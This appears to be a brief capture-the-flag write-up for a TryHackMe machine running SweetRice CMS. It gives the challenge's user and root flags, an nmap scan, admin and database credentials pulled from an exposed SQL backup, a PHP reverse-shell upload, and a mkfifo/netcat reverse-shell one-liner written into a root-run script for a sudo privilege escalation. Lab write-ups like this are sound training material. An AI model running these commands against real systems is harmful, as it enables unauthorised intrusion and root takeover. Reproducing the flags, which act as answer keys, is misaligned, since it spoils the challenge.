export ip=10.10.82.150
```
What is the user flag?
THM{63e5bce9271952aad1113b6f1ac28a07}
```
```
What is the root flag?
THM{6637f41d0177b6f37cb20d775124699f}
```
```
Nmap scan
# Nmap 7.80 scan initiated Tue Jun 23 21:35:57 2020 as: nmap -sC -sV -oN nmap.txt 10.10.210.14
Nmap scan report for 10.10.210.14
Host is up (0.080s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 23 21:36:10 2020 -- 1 IP address (1 host up) scanned in 12.96 seconds
```

found a misconfigured SweetRice CMS instance,
ran gobuster, found multiple dirs,
http://10.10.210.14/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
this is a sql db which contains the admin creds for the login portal @ (http://10.10.210.14/content/as/) manager:Password123

```
"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\"
```
```
Dashboard -> General -> System Settings
Database Setting

    Database : mysql
    Database Host : localhost
    Database Port : 3306
    Database Account : rice
    Database Password : randompass
    Database Name: website
```
At the CMS Dashboard -> Mediacenter
Uploaded standard reverse shell.php from pentest monkeys

(1)
/home/itguy
```
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
```

cat /home/itguy/backup.pl

```
(2)
cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
ls -al /etc/copy.sh
```
-rw-r--rwx 1 root root 77 Jun 23 23:10 /etc/copy.sh
```
change to /etc/copy.sh:
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.9.96 5554 >/tmp/f" > /etc/copy.sh
```

www-data@THM-Chal:/home/itguy$ sudo -l
```
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
and then with the modified file we run /etc/copy.sh file we run the /home/itguy/backup.pl to get root shell because ( look at the root ownership (1) and the content of it (2) ):
```
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl 
```
         
